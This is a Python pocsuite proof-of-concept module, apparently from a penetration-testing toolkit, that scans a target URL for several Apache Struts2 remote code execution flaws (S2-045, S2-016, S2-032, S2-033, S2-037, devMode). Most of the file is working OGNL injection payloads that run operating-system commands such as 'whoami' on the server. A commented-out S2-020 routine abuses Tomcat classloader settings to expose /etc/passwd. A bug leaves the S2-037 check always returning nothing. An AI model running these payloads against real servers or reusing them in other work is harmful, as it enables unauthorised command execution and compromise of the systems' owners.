#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

#解决UnicodeEncodeError: 'ascii' codec can't encode characters in position 7563-7566:
# ordinal not in range(128)

#解决IncompleteRead(0 bytes read)问题
import httplib 
httplib.HTTPConnection._http_vsn = 10 
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
import requests
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

class Strust2POC(POCBase):
    vulID = '5'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-03-07' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-03-07'# 编写 PoC 的日期
    updateDate = '2017-03-07'# PoC 更新的时间,默认和编写时间一样
    references = 'http://mp.weixin.qq.com/s/n_AzKCN6oMwAMRSxDi4QBw'# 漏洞地址来源,0day不用写
    name = 'Strust2 Coder execution'# PoC 名称
    appPowerLink = 'http://struts.apache.org/'# 漏洞厂商主页地址
    appName = 'Strust2'# 漏洞应用名称
    appVersion = 'Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10'# 漏洞影响版本
    vulType = 'code-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Struts 代码执行漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 5-Strust2-getshell.py -u 10.1.5.26 --verify

    def check(self, url):
        result = []       
        #获取漏洞url
        #print url
        #self.strust2_devmode(url)
        #exit()
        try:
            #判断多个漏洞,s2_045
            s2_045 = self.strust2_045(url)
            s2_016 = self.strust2_016(url)
            s2_037 = self.strust2_037(url)
            s2_032 = self.strust2_032(url)
            s2_033 = self.strust2_033(url)
            s2_dev = self.strust2_devmode(url)


            if s2_045:
                result.append(s2_045)
            if s2_016:
                result.append(s2_016)
            if s2_037:
                result.append(s2_037)
            if s2_032:
                result.append(s2_032)
            if s2_033:
                result.append(s2_033)
            if s2_dev:
                result.append(s2_dev)

            #如果没有漏洞 result = {}
           
            
        except Exception,e:
            #print "error!"
            print e
            result = []
        return result

    def _verify(self):
        #定义返回结果
        result = {}        
        #获取漏洞url
        vul_url = '%s' % self.url
        url = vul_url
        #print url
        #self.strust2_devmode(url)
        #exit()
        check_output = self.check(url)
        try:
            if len(check_output)>0:
                result['VerifyInfo'] = {}
                result['name'] = []
                for i in check_output:
                    result['name'].append(i['name'])
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = check_output[0]["VerifyInfo"]['Payload']
            
        except Exception,e:
            #print "error!"
            print e
            result = {}
        print '[+]5 poc done'
        return self.save_output(result)

    def strust2_037(self,url):
        result = {} 
        proxies = {
            # 'http':'http://127.0.0.1:8081',
            # 'https':'http://127.0.0.1:8081',
        }
        payload = '/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=echo vulnerable'
        vul_url = url + payload
        r = req.get(url=vul_url, allow_redirects=False, proxies=proxies,verify=False)
        output = r.content
        print output
        if 'vulnerable' in output:
            exp = '/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=whoami'
            exp_url = url + exp
            r = req.get(url=exp_url, allow_redirects=False, proxies=proxies,verify=False)
            output = r.content
            print output
            if 'cmd=whoami' not in output:
                #print u"存在漏洞"
                result['VerifyInfo'] = {}
                result['name'] = 'strust2_037'
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
            else:
                result = {} 
        result = {}
        return result  


    def strust2_045(self,url):
        result = {}
        headers = {}
        proxies = {
            # 'http':'http://127.0.0.1:8080',
            # 'https':'http://127.0.0.1:8080',
        }
        cmd = "echo vulnerable"
        ua = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
        # payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('vulnerable')).(#ros.flush())}"
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        headers["User-Agent"] = ua
        headers["Content-Type"] = payload
        r = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
        print r.text
        if (r.status_code) == 200 and 'vulnerable' in r.text:
            #print u"存在漏洞"
            result['VerifyInfo'] = {}
            result['name'] = 'strust2_045'
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Payload'] = payload

        else:
            result = {} 
        return result

    def strust2_016(self,url):
        result = {} 
        proxies = {
            # 'http':'http://127.0.0.1:8081',
            # 'https':'http://127.0.0.1:8081',
        }
        send_payload = "?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20vulnerable%27%29.getInputStream%28%29%29%7D"
        vul_url = url + send_payload
        try:
            r = req.get(url=vul_url, allow_redirects=False, proxies=proxies,verify=False)
            output = r.headers['Location']
            output = output[-10:]
            if 'vulnerable' == output:
                #print u"存在漏洞"
                result['VerifyInfo'] = {}
                result['name'] = 'strust2_016'
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = send_payload
            else:
                result = {} 
        except Exception as e:
            print e
        return result   

    # def strust2_020(self,url):
    #     from urlparse import urlparse, urlunparse, urljoin
    #     import time
    #     """
    #     # POC Name : Struts2 S2-020漏洞检测POC
    #     # Author      : CF_HB
    #     # Date        : 2016/06/02
    #     # Refere      : http://drops.wooyun.org/papers/1377
    #     #用法: python S2-020_POC.py -url http://121.42.xxx.xxx:8081/xxx/xxx.action
    #     #POC适用范围: Tomcat6.x,Tomcat7.x,Tomcat8.x 更低的5.x，4.x没有测试环境#
    #     结果：
    #     存在漏洞：
    #         [Congratulations!!!]
    #         http://121.42.xxx.xxx:8081/xxx/xxx.action is vulnerable S2-020.
    #         浏览器访问验证-Windows目标：http://121.42.xxx.xxx:8081/xxx/S2020/explorer.exe
    #         浏览器访问验证-Linux目标：http://121.42.xxx.xxx:8081/xxx//S2020/etc/passwd
    #     不存在漏洞:
    #         [sorry!!]
    #         http://www.csu.wsu.cn/index.php is no vulnerable..
    #     """
    #     result = {}
    #     urlinfo = urlparse(url)
    #     tom8_check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/', '', '', ''))
    #     tom6x7x_url_two = urlunparse((urlinfo.scheme, urlinfo.netloc, urlinfo.path.split('/')[1], '', '', ''))
    #     #print u"网址",tom8_check_url,u"目录",tom6x7x_url_two
    #     headers = {
    #         'Host': urlinfo.hostname,
    #         'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
    #         'Referer': url,
    #         'banner': 's2-020 poc from cf_hb.'
    #        }
    #     poc_tom8 = []
    #     poc_win_tom6x7x = []
    #     poc_linux_tom6x7x = []
    #     # Tomcat 8.x Linux+Windows
    #     poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT")
    #     poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.prefix=S2020POC")
    #     poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp")
    #     poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1")
    #     poc_tom8.append('?poc=<%out.write("This_Site_Is_Vulnerable_S2020");%>')
    #     # Tomcat6.x and Tomcat 7.x - Windows
    #     poc_win_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=C://Windows/")
    #     # Tomcat6.x and Tomcat 7.x - Linux
    #     poc_linux_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=/")
    #     # verify
    #     try:
    #         for poc_add in poc_tom8:
    #             poc_url = urljoin(url, poc_add)
    #             resp = req.get(url=poc_url, headers=headers, timeout=3)
    #             time.sleep(1)
    #         checkurl = urljoin(tom8_check_url, "S2020POC1.jsp")
    #         # tomcat写日志难以捉摸,为了避免漏掉，测试5次每次停顿1秒
    #         # check 5 times
    #         for i in range(0, 5):
    #             resp = req.get(checkurl, headers=headers, timeout=3)
    #             time.sleep(1)
    #             if resp.status_code and "This_Site_Is_Vulnerable_S2020" in resp.content:
    #                 #print "[Congratulations!!!]"
    #                 #print "{url} is vulnerable S2-020.".format(url=self.url)
    #                 result['VerifyInfo'] = {}
    #                 result['VerifyInfo']['URL'] = url
    #                 result['VerifyInfo']['Payload'] = poc_tom8[0]
    #                 result['VerifyInfo']['whoami'] = checkurl + ",os:linux" + "strust2_020"
    #                 return result

    #         # Check tomcat6.x and tomcat7.x - Windows
    #         for poc_add in poc_win_tom6x7x:
    #             poc_url = urljoin(url, poc_add)
    #             resp = req.get(poc_url, headers=headers, timeout=3)
    #             time.sleep(1)
    #             checkurl = tom6x7x_url_two+"/S2020/explorer.exe"
    #             resp = req.head(checkurl, timeout=3)
    #             if resp.status_code == 200:
    #                 size = resp.headers.get('Content-Length')
    #                 fsize = int(size) / 1024
    #                 if fsize > 1:    #检测文件大小是否大于1KB
    #                     #print "[Congratulations!!!!!]"
    #                     #print "{url} is vulnerable S2-020.".format(url=self.url)
    #                     result['VerifyInfo'] = {}
    #                     result['VerifyInfo']['URL'] = url
    #                     result['VerifyInfo']['Payload'] = poc_add
    #                     result['VerifyInfo']['whoami'] = checkurl + ",os:windows" + ",os:linux" + "strust2_020"
    #                     return result                        

    #         # Check tomcat6.x and tomcat7.x - Linux
    #         for poc_add in poc_linux_tom6x7x:
    #             poc_url = urljoin(url, poc_add)
    #             resp = req.get(poc_url, headers=headers, timeout=3)
    #             time.sleep(1)
    #             checkurl = tom6x7x_url_two+"/S2020/etc/passwd"
    #             resp = req.get(checkurl, headers=headers, timeout=3)
    #             if resp.status_code and ("/bin/bash" in resp.content or "root:x:0:0:root:/root" in resp.content):
    #                 result['VerifyInfo'] = {}
    #                 result['VerifyInfo']['URL'] = url
    #                 result['VerifyInfo']['Payload'] = poc_add
    #                 result['VerifyInfo']['whoami'] = checkurl + ",os:linux" + "strust2_020"
    #                 return result   
    #         #print "[sorry!!]"
    #         #print "{url} is no vulnerable..".format(url=self.url)
    #         return result 
    #     except Exception, e:
    #         #print "Failed to connection target, try again.."
    #         return result


    def strust2_032(self,url): 
        import sys,re
        from urlparse import urljoin
        result = {}
        '''    S2-032辅助工具V1.0
        #    Author: CF_HB
        #    CreatedTime: 2016-04-28
        #    漏洞编号:(CVE-2016-3081)
        #V1.0功能说明:
        #     1) 漏洞检查
        #     2) 漏洞命令执行
        #     3) POC和EXP可以自定义添加
        #     4) 暂只支持GET方式提交payload
        #To Do:
        #     1) 支持POST类型提交
        #     2) 支持IP+PORT(http://114.114.114.114:8080/)类型的自动化检测
        #     3) 随时补充POC和EXP
        #用法说明如下:
        #     1) 检查目标是否存在S2-032漏洞用法
        #     usage: python S2032.py http://www.test.com/login.action check
        #     2) 一句话命令执行
        #     usage: python S2032.py http://www.test.com/login.action "net user"
        #     3) 交互式命令执行(反弹shell下，或者终端下面使用.)
        #     usage: python S2032.py http://www.test.com/login.action cmdtool
        #####声明:
        #       本脚本仅用于安全测试，请勿用于违法犯罪!
        '''
        S2032POC = []
        S2032POC.append('?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo%20vulnerable')
        # POC集合
        # 在POC的判断点替换成：This_site_has_s2-032_vulnerabilities
        # S2032POC.append("?test=This_site_has_s2-032_vulnerabilities&method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.test,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close")
        # S2032POC.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=echo  This_site_has_s2-032_vulnerabilities")

        S2032EXP = []

        # command_exp集合
        # 新的EXP在执行命令的点设置为:GiveMeCommand,然后像下面的方式添加即可
        # nsf_exp
        # S2032EXP.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&command=GiveMeCommand")
        # shack2_exp
        # S2032EXP.append("?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=GiveMeCommand&pp=\\\\A&ppp=%20&encoding=UTF-8")
        # S2032EXP.append("?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=GiveMeCommand&pp=\\\\AAAA&ppp=%20&encoding=UTF-8 ")
        # 用于鉴别EXP是否成功利用的错误关键字
        # Error_Message = [r'</[^>]+>', r'Error report', r'Apache Tomcat', r'memberAccess', r'ServletActionContext']
        # hashKey = "This_site_has_s2-032_vulnerabilities"

        try:
            for poc in S2032POC:
                targetURL = urljoin(url, poc) #url+poc
                #print targetURL
                res = req.get(targetURL, timeout=3, allow_redirects=False,)
                resulttext = res.text.encode("utf-8").strip().strip('\x00')
                # print resulttext
                if 'vulnerable' in resulttext:
                    exp = '?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=whoami'
                    targetURL = urljoin(url, exp)
                    print targetURL
                    res = req.get(targetURL, timeout=3, allow_redirects=False,)
                    resulttext = res.text.encode("utf-8").strip().strip('\x00')
                    print resulttext
                    if 'cmd=whoami' not in resulttext:
                        #print u"存在漏洞"
                        result['VerifyInfo'] = {}
                        result['name'] = 'strust2_032'
                        result['VerifyInfo']['URL'] = url
                        result['VerifyInfo']['Payload'] = targetURL
                        # return result
            #print u"不存在漏洞"
           
        except Exception, e:
            print e
            #print "something error!!",e
        return result

    def strust2_033(self,url): 
        from urlparse import urljoin
        result = {}
        # S2-033 POC
        # Author: CF_HB
        # 时间：2016年6月6日
        # 漏洞编号：CVE-2016-3087 (S2-033)
        # 漏洞详情：http://blog.nsfocus.net/apache-struts2-vulnerability-technical-analysis-protection-scheme-s2-033/
        s2033_poc = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo vulnerable"
        try:
            poc_url = urljoin(url,s2033_poc)
            #print poc_url
            s = req.session()
            res = s.post(poc_url, timeout=4, allow_redirects=False, verify=False)
            print '033poc###################################'
            print res.content
            if res.status_code == 200 and "vulnerable" in res.content:
                #print "{url} is vulnerable S2-033.".format(url=url)
                    exp = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=whoami"
                    target = urljoin(url, exp) 
                    res = req.post(target, timeout=3, allow_redirects=False, verify=False)
                    restext = res.text.encode('utf-8').strip().strip('\x00')
                    print '033exp###########################'
                    print restext
                    if 'command=whoami' not in restext:
                        result['VerifyInfo'] = {}
                        result['name'] = 'strust2_033'
                        result['VerifyInfo']['URL'] = url
                        result['VerifyInfo']['Payload'] = poc_url
            else:
                #print "{url} is not vulnerable..".format(url=url)
                pass
        except Exception, e:
            print e
            #print "Failed to connection target, try again.."
        return result 


    def strust2_devmode(self,url):
        from urlparse import urljoin
        result = {}
        #devMode模式漏洞
        data_dev = '?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=echo vulnerable'
        try:
            poc_url = urljoin(url,data_dev)
            #print poc_url
            s = req.session()
            res = s.post(poc_url, timeout=4, allow_redirects=False, verify=False)
            if "vulnerable" in res.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = poc_url + "strust2_devmode"    
            else:
                #print "{url} is not vulnerable..".format(url=url)
                pass
        except Exception, e:
            #print "Failed to connection target, try again.."
            print e
        return result         

    def _attack(self):
        result = {}
        # 攻击代码
        # 
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
            #生产报告错误，在这里记得
            #data = result['VerifyInfo']['URL'] + result['VerifyInfo']['whoami'] + "\n"
            #with open('result.txt','a+') as f:
            #    f.write(str(data))

        else:
            output.fail()
        return output

register(Strust2POC)

